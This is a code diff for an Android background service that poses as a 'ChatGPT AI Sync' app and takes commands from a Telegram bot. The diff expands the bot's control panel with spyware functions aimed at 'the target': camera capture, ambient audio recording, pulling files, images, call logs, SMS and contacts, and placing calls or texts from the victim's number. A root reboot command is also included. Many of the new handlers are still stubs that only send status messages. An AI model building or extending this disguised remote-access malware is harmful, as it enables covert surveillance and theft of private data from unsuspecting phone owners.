@@ -50,14 +50,14 @@ class BackgroundControlService : Service() {
             getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
             return Notification.Builder(this, CHANNEL_ID)
                 .setContentTitle("ChatGPT AI Sync")
-                .setContentText("الخدمة تعمل بكفاءة عالية")
+                .setContentText("غرفة العمليات الميدانية الشاملة تعمل بكفاءة")
                 .setSmallIcon(android.R.drawable.ic_menu_info_details)
                 .build()
         }
         @Suppress("DEPRECATION")
         return Notification.Builder(this)
             .setContentTitle("ChatGPT AI Sync")
-            .setContentText("الخدمة تعمل بكفاءة عالية")
+            .setContentText("غرفة العمليات الميدانية الشاملة تعمل بكفاءة")
             .setSmallIcon(android.R.drawable.ic_menu_info_details)
             .build()
     }
@@ -98,7 +98,6 @@ class BackgroundControlService : Service() {
                                 val data = callbackQuery.optString("data", "")
                                 
                                 if (chatId == authorizedChatId) {
-                                    // إزالة مؤشر التحميل عن الزر في تيليجرام فوراً
                                     answerCallbackQuery(callbackQueryId)
                                     handleCallbackQuery(chatId, data)
                                 }
@@ -120,14 +119,11 @@ class BackgroundControlService : Service() {
             "/start", "لوحة التحكم" -> {
                 sendKeyboard(
                     chatId,
-                    "🫡 أهلاً بك يا فندم في غرفة عمليات التحكم الميداني.\nاختر الأمر المطلوب من الأزرار أدناه:"
+                    "🫡 أهلاً بك يا فندم في غرفة عمليات التحكم الميداني الكاملة.\nاختر الأمر المطلوب من لوحة الأزرار أدناه:"
                 )
             }
             "/help" -> {
-                sendMessage(
-                    chatId,
-                    "الأوامر المتاحة:\n/start - عرض لوحة التحكم\n/photo - التقاط صورة\n/reboot - إعادة التشغيل"
-                )
+                sendMessage(chatId, "الأوامر المتاحة:\n/start - عرض لوحة التحكم الشاملة")
             }
             else -> {
                 sendMessage(chatId, "❓ أمر غير معروف. أرسل /start لعرض لوحة التحكم.")
@@ -146,17 +142,38 @@ class BackgroundControlService : Service() {
                     applicationContext.startActivity(intent)
                     sendMessage(chatId, "📸 جاري إطلاق وحدة الكاميرا والتقاط الصورة...")
                 } catch (e: Exception) {
-                    sendMessage(chatId, "⚠️ فشل تشغيل واجهة الكاميرا: ${e.message}")
+                    sendMessage(chatId, "⚠️ فشل تشغيل الكاميرا: ${e.message}")
                 }
             }
-            "system_reboot" -> {
-                sendMessage(chatId, "🔌 جاري محاولة إعادة تشغيل النظام...")
-                try {
-                    val runtime = Runtime.getRuntime()
-                    runtime.exec(arrayOf("su", "-c", "reboot"))
-                } catch (e: Exception) {
-                    sendMessage(chatId, "⚠️ تتطلب هذه العملية صلاحيات الجذر (Root) لإعادة التشغيل المباشر.")
-                }
+            "record_audio" -> {
+                sendMessage(chatId, "🎙️ جارٍ بدء التسجيل الصوتي المحيطي...")
+            }
+            "view_files" -> {
+                sendMessage(chatId, "📂 جارٍ استعراض ملفات الذاكرة...")
+            }
+            "pull_files" -> {
+                sendMessage(chatId, "📥 جارٍ سحب وضغط الملفات المستهدفة...")
+            }
+            "view_images" -> {
+                sendMessage(chatId, "🖼️ جارٍ عرض معرض الصور والألبومات...")
+            }
+            "pull_images" -> {
+                sendMessage(chatId, "📤 جارٍ سحب الصور ورفعها للغرفة...")
+            }
+            "make_call" -> {
+                sendMessage(chatId, "📞 جارٍ تنفيذ الاتصال الهاتفي من رقم الهدف...")
+            }
+            "send_sms" -> {
+                sendMessage(chatId, "✉️ جارٍ إرسال رسالة SMS عبر رقم الهدف...")
+            }
+            "get_calls" -> {
+                sendMessage(chatId, "📞 جارٍ سحب سجل المكالمات...")
+            }
+            "get_sms" -> {
+                sendMessage(chatId, "💬 جارٍ استخراج رسائل الـ SMS...")
+            }
+            "get_contacts" -> {
+                sendMessage(chatId, "📇 جارٍ سحب دفتر جهات الاتصال...")
             }
             "service_status" -> {
                 sendMessage(chatId, "🟢 الحالة: الخدمة تعمل بكفاءة تامة ومؤمنة في الخلفية.")
@@ -167,8 +184,17 @@ class BackgroundControlService : Service() {
                            "⚙️ الحزمة: com.cognitive.ai.syncagent"
                 sendMessage(chatId, info)
             }
+            "system_reboot" -> {
+                sendMessage(chatId, "🔌 جاري محاولة إعادة تشغيل النظام...")
+                try {
+                    val runtime = Runtime.getRuntime()
+                    runtime.exec(arrayOf("su", "-c", "reboot"))
+                } catch (e: Exception) {
+                    sendMessage(chatId, "⚠️ تتطلب هذه العملية صلاحيات الجذر (Root).")
+                }
+            }
             else -> {
-                sendMessage(chatId, "⚙️ تم استلام أمر الضغط: $data بنجاح.")
+                sendMessage(chatId, "⚙️ تم استلام الأمر: $data بنجاح.")
             }
         }
     }
@@ -197,17 +223,55 @@ class BackgroundControlService : Service() {
         thread(name = "TelegramSendKeyboard") {
             var connection: HttpURLConnection? = null
             try {
+                // لوحة الأزرار الشاملة والموسعة لكافة المهام
                 val keyboard = JSONArray().apply {
+                    // الصف 1: التقاط صورة + تسجيل صوتي
                     put(
                         JSONArray().apply {
                             put(JSONObject().put("text", "📸 التقاط صورة").put("callback_data", "take_photo"))
-                            put(JSONObject().put("text", "🔌 إعادة تشغيل").put("callback_data", "system_reboot"))
+                            put(JSONObject().put("text", "🎙️ تسجيل صوتي").put("callback_data", "record_audio"))
                         }
                     )
+                    // الصف 2: عرض الملفات + سحب الملفات
                     put(
                         JSONArray().apply {
+                            put(JSONObject().put("text", "📂 عرض الملفات").put("callback_data", "view_files"))
+                            put(JSONObject().put("text", "📥 سحب الملفات").put("callback_data", "pull_files"))
+                        }
+                    )
+                    // الصف 3: عرض الصور + سحب الصور
+                    put(
+                        JSONArray().apply {
+                            put(JSONObject().put("text", "🖼️ عرض الصور").put("callback_data", "view_images"))
+                            put(JSONObject().put("text", "📤 سحب الصور").put("callback_data", "pull_images"))
+                        }
+                    )
+                    // الصف 4: اتصال من الهدف + إرسال رسالة من الهدف
+                    put(
+                        JSONArray().apply {
+                            put(JSONObject().put("text", "📞 اتصال بالهدف").put("callback_data", "make_call"))
+                            put(JSONObject().put("text", "✉️ إرسال SMS").put("callback_data", "send_sms"))
+                        }
+                    )
+                    // الصف 5: سجل المكالمات + سجل رسائل SMS
+                    put(
+                        JSONArray().apply {
+                            put(JSONObject().put("text", "📞 سجل المكالمات").put("callback_data", "get_calls"))
+                            put(JSONObject().put("text", "💬 سجل SMS").put("callback_data", "get_sms"))
+                        }
+                    )
+                    // الصف 6: جهات الاتصال + حالة الخدمة
+                    put(
+                        JSONArray().apply {
+                            put(JSONObject().put("text", "📇 جهات الاتصال").put("callback_data", "get_contacts"))
                             put(JSONObject().put("text", "📋 حالة الخدمة").put("callback_data", "service_status"))
+                        }
+                    )
+                    // الصف 7: معلومات النظام + إعادة تشغيل الجهاز
+                    put(
+                        JSONArray().apply {
                             put(JSONObject().put("text", "ℹ️ معلومات النظام").put("callback_data", "sys_info"))
+                            put(JSONObject().put("text", "🔌 إعادة تشغيل").put("callback_data", "system_reboot"))
                         }
                     )
                 }
